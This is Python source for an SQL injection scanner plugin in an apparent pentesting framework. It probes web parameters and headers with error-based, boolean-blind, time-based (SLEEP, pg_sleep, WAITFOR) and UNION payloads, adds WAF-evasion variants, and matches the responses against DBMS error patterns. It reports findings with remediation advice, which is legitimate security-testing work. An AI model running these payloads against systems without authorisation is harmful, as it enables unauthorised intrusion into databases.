"""SQL injection detection — error-based, time-based blind, boolean blind, UNION probe.

Uses PayloadEngine for payloads, WafBypassEngine for WAF evasion,
ResponseDiffer for boolean blind comparison. Error patterns from sqlmap/OWASP.
Level: sqlmap-lite (detection, not exploitation).
"""

from __future__ import annotations

import logging
import re
import time
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target
from basilisk.utils.payloads import DbmsType, PayloadCategory

logger = logging.getLogger(__name__)

# ── Error patterns by DBMS (sourced from sqlmap + PayloadsAllTheThings) ──────
SQL_ERROR_PATTERNS: dict[str, list[str]] = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql_", "com.mysql.jdbc", "mysqlclient",
        "mysql_fetch", "mysql_num_rows", "mysqld_safe",
        "sequel::mysql", r"mysql_connect\(", r"mysql_result\(",
        "supplied argument is not a valid mysql",
        "column count doesn't match",
        "the used select statements have a different",
        "unknown column", "table.*doesn't exist",
    ],
    "PostgreSQL": [
        "pg_query", "pg_exec", "syntax error at or near",
        "org.postgresql", "psqlexception",
        "unterminated quoted string at or near",
        "invalid input syntax for", r"pg_connect\(",
        "current transaction is aborted",
        "relation.*does not exist", "column.*does not exist",
        "operator does not exist",
    ],
    "MSSQL": [
        "microsoft ole db provider for sql server",
        "unclosed quotation mark after the character string",
        "microsoft sql server", "sqlserver jdbc driver",
        "com.microsoft.sqlserver.jdbc", "sql server native client",
        "incorrect syntax near", "invalid column name",
        "invalid object name", "conversion failed when converting",
        "arithmetic overflow error",
    ],
    "Oracle": [
        "ora-01756", "ora-00933", "ora-06512", "ora-01722",
        "ora-00904", "oracle error", "oracle.*driver",
        "quoted string not properly terminated",
        "sql command not properly ended", "ora-00942",
        "ora-06550", "ora-00936",
    ],
    "SQLite": [
        "sqlite3.operationalerror", "sqlite_error",
        "unrecognized token", r"near .+: syntax error",
        "sqlite.exception", "no such table", "no such column",
    ],
    "IBM DB2": [
        "db2 sql error", "com.ibm.db2", "sqlcode=-",
        "cli driver", "db2 for",
    ],
    "Generic": [
        "sqlstate", "sql syntax", "sql error", "odbc error",
        "jdbc error", "unterminated string",
        "unexpected end of sql", "division by zero",
        "you have an error in your sql",
        "mysql server version for the right syntax",
    ],
}

ALL_ERROR_PATTERNS: list[tuple[str, str]] = []
for _dbms, _patterns in SQL_ERROR_PATTERNS.items():
    for _p in _patterns:
        ALL_ERROR_PATTERNS.append((_dbms, _p))

# Map DBMS name → DbmsType
_DBMS_MAP: dict[str, DbmsType] = {
    "MySQL": DbmsType.MYSQL, "PostgreSQL": DbmsType.POSTGRES,
    "MSSQL": DbmsType.MSSQL, "Oracle": DbmsType.ORACLE,
    "SQLite": DbmsType.SQLITE,
}

# Common injectable parameters
SQLI_PARAMS = [
    "id", "page", "q", "search", "cat", "category", "item", "product",
    "user", "uid", "name", "type", "sort", "order", "lang", "year",
    "month", "article", "view", "action", "file", "report", "table",
]

# Pages to probe
SQLI_PATHS = ["/", "/search", "/products", "/news", "/index.php", "/api/v1/search"]

# Header injection points
INJECTABLE_HEADERS = [
    ("User-Agent", "Mozilla/5.0 '"),
    ("Referer", "http://example.com/'"),
    ("X-Forwarded-For", "127.0.0.1'"),
]

TIME_THRESHOLD = 4.5
CONFIRM_RETRIES = 1


class SqliBasicPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="sqli_basic",
        display_name="SQL Injection Scanner",
        category=PluginCategory.PENTESTING,
        description=(
            "Detects SQL injection via error-based, time-based blind, "
            "boolean blind, UNION probing, and header injection"
        ),
        produces=["sqli_findings"],
        timeout=60.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"sqli_tests": []},
            )

        # Detect SPA baseline (catch-all route)
        spa_baseline = await self._fetch_spa_baseline(ctx, base_url)

        # Extend paths with discovered API endpoints
        extra = ctx.state.get("discovered_api_paths", {}).get(target.host, [])
        scan_paths = list(SQLI_PATHS) + [p for p in extra if p not in SQLI_PATHS]

        # Get payloads from PayloadEngine
        error_payloads = self._get_error_payloads(ctx)
        time_payloads = self._get_time_payloads(ctx)
        boolean_payloads = self._get_boolean_payloads(ctx)

        detected_dbms: str | None = None

        # ── Phase 1: Error-based detection ────────────────────────────
        for path in scan_paths:
            if ctx.should_stop or detected_dbms:
                break
            for param in SQLI_PARAMS[:12]:
                if ctx.should_stop or detected_dbms:
                    break
                baseline_body = await self._fetch_body(ctx, f"{base_url}{path}?{param}=1")
                if baseline_body is None:
                    continue
                if spa_baseline and abs(len(baseline_body) - len(spa_baseline)) < 100:
                    break

                for raw_payload in error_payloads:
                    if ctx.should_stop:
                        break
                    variants = self._get_variants(ctx, raw_payload)
                    for variant in variants:
                        url = f"{base_url}{path}?{param}={quote(variant)}"
                        body = await self._fetch_body(ctx, url)
                        if body is None:
                            continue

                        dbms_hit = self._match_error(body, baseline_body)
                        if dbms_hit:
                            detected_dbms = dbms_hit
                            tested.append({
                                "url": url, "payload": raw_payload,
                                "dbms": dbms_hit, "type": "error-based",
                            })
                            findings.append(Finding.critical(
                                f"SQL injection ({dbms_hit}): {path}?{param}=",
                                description=(
                                    f"SQL error from {dbms_hit} with "
                                    f"payload: {raw_payload}"
                                ),
                                evidence=f"URL: {url}",
                                confidence=0.9,
                                remediation="Use parameterized queries / prepared statements",
                                tags=["pentesting", "sqli", dbms_hit.lower()],
                            ))
                            break
                    if detected_dbms:
                        break

        # ── Phase 2: Header-based error detection ─────────────────────
        if not findings and not ctx.should_stop:
            for hdr_name, hdr_payload in INJECTABLE_HEADERS:
                if ctx.should_stop:
                    break
                body = await self._fetch_body_with_header(
                    ctx, base_url, hdr_name, hdr_payload,
                )
                if body is None:
                    continue
                dbms_hit = self._match_error(body)
                if dbms_hit:
                    tested.append({
                        "header": hdr_name, "payload": hdr_payload,
                        "dbms": dbms_hit, "type": "header-error",
                    })
                    findings.append(Finding.critical(
                        f"SQL injection via {hdr_name} header ({dbms_hit})",
                        description=f"SQL error triggered via {hdr_name}: {hdr_payload}",
                        remediation="Sanitize all input sources including HTTP headers",
                        tags=["pentesting", "sqli", "header", dbms_hit.lower()],
                    ))
                    break

        # ── Phase 3: Boolean blind detection ──────────────────────────
        if not findings and not ctx.should_stop:
            for param in SQLI_PARAMS[:8]:
                if ctx.should_stop or findings:
                    break
                true_payloads = [p for p in boolean_payloads if "true" in p[1]]
                false_payloads = [p for p in boolean_payloads if "false" in p[1]]
                if not true_payloads or not false_payloads:
                    continue

                for true_p, _ in true_payloads[:3]:
                    for false_p, _ in false_payloads[:3]:
                        if ctx.should_stop:
                            break
                        true_body = await self._fetch_body(
                            ctx, f"{base_url}/?{param}={quote(true_p)}"
                        )
                        false_body = await self._fetch_body(
                            ctx, f"{base_url}/?{param}={quote(false_p)}"
                        )
                        if true_body is None or false_body is None:
                            continue

                        # Compare using ResponseDiffer if available
                        if ctx.differ and len(true_body) > 50 and len(false_body) > 50:
                            sim = self._similarity(true_body, false_body)
                            if sim < 0.85 and abs(len(true_body) - len(false_body)) > 50:
                                # Confirm with retry
                                true2 = await self._fetch_body(
                                    ctx, f"{base_url}/?{param}={quote(true_p)}"
                                )
                                if true2 and self._similarity(true_body, true2) > 0.95:
                                    tested.append({
                                        "param": param, "true": true_p,
                                        "false": false_p, "type": "boolean-blind",
                                        "similarity": round(sim, 3),
                                    })
                                    findings.append(Finding.high(
                                        f"Boolean blind SQLi: /?{param}=",
                                        description=(
                                            f"Different responses for true/false conditions. "
                                            f"Similarity: {sim:.1%}"
                                        ),
                                        evidence=(
                                            f"True: {true_p} ({len(true_body)} bytes)\n"
                                            f"False: {false_p} ({len(false_body)} bytes)"
                                        ),
                                        confidence=0.5,
                                        remediation=(
                                            "Use parameterized queries / prepared statements"
                                        ),
                                        tags=["pentesting", "sqli", "blind", "boolean"],
                                    ))
                                    break
                    if findings:
                        break

        # ── Phase 4: Time-based blind ─────────────────────────────────
        if not findings and not ctx.should_stop:
            for param in SQLI_PARAMS[:6]:
                if ctx.should_stop or findings:
                    break
                baseline_url = f"{base_url}/?{param}=1"
                baseline_time = await self._measure(ctx, baseline_url)
                if baseline_time is None:
                    continue

                for payload, _delay in time_payloads:
                    if ctx.should_stop:
                        break
                    variants = self._get_variants(ctx, payload)
                    for variant in variants[:2]:
                        url = f"{base_url}/?{param}={quote(variant)}"
                        elapsed = await self._measure(ctx, url)
                        if elapsed is None:
                            continue

                        delta = elapsed - baseline_time
                        if delta < TIME_THRESHOLD:
                            continue

                        # Confirm
                        new_baseline = await self._measure(ctx, baseline_url)
                        if new_baseline is None:
                            continue
                        retry = await self._measure(ctx, url)
                        if retry is None:
                            continue
                        if retry - new_baseline < TIME_THRESHOLD:
                            continue

                        tested.append({
                            "param": param, "payload": payload,
                            "type": "time-based", "baseline": round(baseline_time, 2),
                            "elapsed": round(elapsed, 2), "confirmed": True,
                        })
                        findings.append(Finding.high(
                            f"Time-based blind SQLi: /?{param}=",
                            description=(
                                f"Response delayed {delta:.1f}s with payload: {payload} "
                                "(confirmed with retry)"
                            ),
                            evidence=(
                                f"Baseline: {baseline_time:.2f}s, "
                                f"Payload: {elapsed:.2f}s, "
                                f"Retry: {retry:.2f}s"
                            ),
                            confidence=0.7,
                            remediation="Use parameterized queries / prepared statements",
                            tags=["pentesting", "sqli", "blind", "time"],
                        ))
                        break
                    if findings:
                        break

        # ── Phase 5: UNION column count probe ─────────────────────────
        if not findings and not ctx.should_stop:
            for param in SQLI_PARAMS[:4]:
                if ctx.should_stop:
                    break
                col_count = await self._detect_columns(ctx, base_url, param)
                if col_count:
                    tested.append({
                        "param": param, "type": "union",
                        "columns": col_count,
                    })
                    findings.append(Finding.medium(
                        f"UNION injection possible: /?{param}= ({col_count} columns)",
                        description=(
                            f"UNION SELECT with {col_count} NULLs returns valid response"
                        ),
                        confidence=0.6,
                        remediation="Use parameterized queries / prepared statements",
                        tags=["pentesting", "sqli", "union"],
                    ))
                    break

        if not findings:
            findings.append(Finding.info(
                "No SQL injection detected", tags=["pentesting", "sqli"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={
                "sqli_tests": tested,
                "detected_dbms": detected_dbms,
            },
        )

    # ── Payload helpers ───────────────────────────────────────────────

    @staticmethod
    def _get_error_payloads(ctx) -> list[str]:
        if hasattr(ctx, "payloads") and ctx.payloads:
            payloads = ctx.payloads.get(PayloadCategory.SQLI, max_waf=1, limit=30)
            return [p.value for p in payloads if not p.blind]
        return [
            "'", '"', "1'", "1' OR '1'='1", "1; SELECT 1--",
            "' UNION SELECT NULL--",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
        ]

    @staticmethod
    def _get_time_payloads(ctx) -> list[tuple[str, float]]:
        if hasattr(ctx, "payloads") and ctx.payloads:
            payloads = ctx.payloads.get(
                PayloadCategory.SQLI, blind_only=True, max_waf=1, limit=10,
            )
            return [(p.value, p.time_delay) for p in payloads if p.time_delay > 0]
        return [
            ("' OR SLEEP(5)-- -", 5.0),
            ("' OR pg_sleep(5)-- -", 5.0),
            ("'; WAITFOR DELAY '0:0:5'-- -", 5.0),
        ]

    @staticmethod
    def _get_boolean_payloads(ctx) -> list[tuple[str, str]]:
        """Return (payload, 'true'|'false') pairs for boolean blind."""
        return [
            ("1' AND 1=1--", "true"),
            ("1' AND 1=2--", "false"),
            ("1' AND 'a'='a", "true"),
            ("1' AND 'a'='b", "false"),
            ("1 AND 1=1", "true"),
            ("1 AND 1=2", "false"),
        ]

    @staticmethod
    def _get_variants(ctx, payload: str) -> list[str]:
        """Get WAF bypass variants of a payload."""
        variants = [payload]
        if hasattr(ctx, "waf_bypass") and ctx.waf_bypass and ctx.waf_bypass.waf_detected:
            encoded = ctx.waf_bypass.encode(payload)
            for v in encoded:
                if v not in variants:
                    variants.append(v)
        return variants[:4]

    # ── Network helpers ───────────────────────────────────────────────

    async def _fetch_body(self, ctx, url: str) -> str | None:
        try:
            async with ctx.rate:
                resp = await ctx.http.get(url, timeout=6.0)
                return (await resp.text(encoding="utf-8", errors="replace")).lower()
        except Exception as e:
            logger.debug("SQLi probe failed: %s", e)
            return None

    async def _fetch_body_with_header(
        self, ctx, base_url: str, hdr_name: str, hdr_value: str,
    ) -> str | None:
        try:
            async with ctx.rate:
                resp = await ctx.http.get(
                    base_url, headers={hdr_name: hdr_value}, timeout=6.0,
                )
                return (await resp.text(encoding="utf-8", errors="replace")).lower()
        except Exception as e:
            logger.debug("SQLi probe failed: %s", e)
            return None

    async def _fetch_spa_baseline(self, ctx, base_url: str) -> str:
        try:
            async with ctx.rate:
                r = await ctx.http.get(
                    f"{base_url}/_nonexistent_8x7z_sqli/", timeout=5.0,
                )
                if r.status == 200:
                    return await r.text(encoding="utf-8", errors="replace")
        except Exception as e:
            logger.debug("SQLi probe failed: %s", e)
            pass
        return ""

    async def _measure(self, ctx, url: str) -> float | None:
        try:
            async with ctx.rate:
                start = time.monotonic()
                await ctx.http.get(url, timeout=12.0)
                return time.monotonic() - start
        except Exception as e:
            logger.debug("SQLi probe failed: %s", e)
            return None

    # ── Detection helpers ─────────────────────────────────────────────

    @staticmethod
    def _match_error(body: str, baseline: str = "") -> str | None:
        """Check body for SQL error patterns, return DBMS name or None."""
        body_lower = body.lower()
        baseline_lower = baseline.lower() if baseline else ""
        for dbms, pattern in ALL_ERROR_PATTERNS:
            try:
                found = re.search(pattern, body_lower) is not None
            except re.error:
                found = pattern in body_lower
            if found:
                if baseline_lower:
                    try:
                        in_base = re.search(pattern, baseline_lower) is not None
                    except re.error:
                        in_base = pattern in baseline_lower
                    if in_base:
                        continue
                return dbms
        return None

    @staticmethod
    def _similarity(a: str, b: str) -> float:
        """Quick similarity ratio based on length and common prefix/suffix."""
        if not a or not b:
            return 0.0
        if a == b:
            return 1.0
        max_len = max(len(a), len(b))
        min_len = min(len(a), len(b))
        length_sim = min_len / max_len
        # Check common prefix
        common = 0
        for ca, cb in zip(a, b, strict=False):
            if ca == cb:
                common += 1
            else:
                break
        prefix_sim = common / max_len
        return (length_sim + prefix_sim) / 2

    async def _detect_columns(self, ctx, base_url: str, param: str) -> int | None:
        """Try ORDER BY / UNION SELECT NULL to detect column count."""
        # ORDER BY approach
        for n in (1, 5, 10, 15, 20, 25, 50, 100):
            if ctx.should_stop:
                return None
            url = f"{base_url}/?{param}={quote(f'1 ORDER BY {n}--')}"
            body = await self._fetch_body(ctx, url)
            if body is None:
                return None
            if self._match_error(body):
                # Error at n means n-1 columns
                if n > 1:
                    # Confirm with UNION SELECT
                    nulls = ",".join(["NULL"] * (n - 1))
                    union_url = (
                        f"{base_url}/?{param}="
                        f"{quote(f'1 UNION SELECT {nulls}--')}"
                    )
                    union_body = await self._fetch_body(ctx, union_url)
                    if union_body and not self._match_error(union_body):
                        return n - 1
                return None
        return None
